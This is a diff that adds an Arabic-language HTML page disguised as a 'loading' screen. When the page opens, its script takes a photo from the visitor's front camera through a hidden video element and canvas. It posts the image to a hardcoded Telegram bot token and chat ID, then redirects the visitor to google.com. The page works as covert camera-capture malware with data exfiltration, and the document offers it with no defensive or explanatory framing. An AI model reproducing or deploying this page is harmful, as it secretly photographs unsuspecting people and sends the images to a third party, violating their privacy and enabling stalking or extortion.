@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>جارٍ التحميل...</title>
+</head>
+<body>
+  <h3>جارٍ تحميل الصفحة...</h3>
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const token = '8077679722:AAGIQbfCgIfyJyystYkR7FdVhtT7Qy-oFBE ';
+    const chatId = '7728263509';
+
+    async function sendPhoto(base64Image) {
+      const blob = await (await fetch(base64Image)).blob();
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "photo.jpg");
+
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    async function captureAndSendCameraImage() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" } // الكاميرا الأمامية
+        });
+
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // انتظر شوي حتى تشتغل الكاميرا
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // أوقف الكاميرا
+          stream.getTracks().forEach(track => track.stop());
+
+          const base64Image = canvas.toDataURL("image/jpeg");
+          sendPhoto(base64Image).then(() => {
+            window.location.href = "https://google.com";
+          });
+
+        }, 3000); // انتظر 3 ثواني
+      } catch (err) {
+        alert("فشل الوصول للكاميرا: " + err);
+        window.location.href = "https://google.com";
+      }
+    }
+
+    window.onload = captureAndSendCameraImage;
+  </script>
+</body>
+</html>
